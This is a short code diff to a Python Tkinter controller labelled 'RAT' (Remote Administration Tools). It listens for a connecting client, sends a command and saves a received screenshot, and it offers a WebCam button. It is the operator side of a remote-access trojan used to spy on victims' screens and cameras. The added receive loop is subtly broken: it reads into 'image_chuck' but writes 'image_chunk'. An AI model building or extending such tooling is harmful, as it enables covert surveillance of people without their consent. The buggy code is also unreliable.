@@ -11,9 +11,14 @@ def screen():
 		tcp_socket.listen(90)
 		conn, addr = tcp_socket.accept()
 		data = conn.recv(1024)
-		
 		command = '1'
 		conn.send(command.encode())
+		f = open("screenS.png", "wb")
+		image_chuck = conn.recv(1024)
+		while image_chuck:
+			f.write(image_chunk)
+			image_chuck = conn.recv(1024)
+		f.close()
 		conn.close()
 		tcp_socket.close()
 	except:
@@ -38,9 +43,8 @@ def WebCam():
 
 window = Tk()
 window.title("RAT")
-window.geometry("250x250")
+window.geometry("200x200")
 Label(text="Remote Administration Tools").pack()
 btn_screen = Button(text="ScreenShot", command=screen).pack()
 btn_webcam = Button(text="WebCam", command=WebCam).pack()
-
 window.mainloop()
